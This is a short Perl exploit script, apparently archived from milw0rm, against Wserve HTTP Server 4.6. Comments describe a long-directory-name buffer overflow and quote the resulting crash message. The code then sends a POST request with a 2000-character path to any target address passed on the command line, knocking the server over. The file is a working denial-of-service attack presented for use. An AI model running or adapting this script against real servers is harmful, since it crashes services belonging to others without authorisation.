#!perl
# Wserve HTTP Server 4.6 Version (Long Directory Name) Buffer Overflow - Denial Of Service
# Type :
# Buffer Overflow - Denial of Service
# Release Date :
# {2007-04-05}
# Product / Vendor :
# Wserve HTTP Server
# http://sourceforge.net/projects/whttp
# PoC :
# GET / HTTP/1.0\r\n /127.0.0.1:80/AAAAAA[2000]. 
# Error :
# Buffer Overrun Detected!
# Program:...~\Temp\Rar$EX00.906\wserve\wserve_console.exe
# A buffer overrun has been detected which has corrupted the program's internal state.The program cannot safely continue 
# execution and must now be terminated

# Exploit :

use LWP::UserAgent;

$unique = LWP::UserAgent->new;

$address = shift or die("Insert A Target");

$req = HTTP::Request->new(POST => "http://$address:80/" . A x 2000);

$res = $unique->request($req);

print $res->as_string;

# Tested :

# --- Wserve HTTP Server 4.6 ---

# Vulnerable :

# --- Wserve HTTP Server 4.6 ---

# Author :

# UniquE-Key{UniquE-Cracker}
# UniquE(at)UniquE-Key.Org
# http://www.UniquE-Key.Org

# milw0rm.com [2007-04-05]
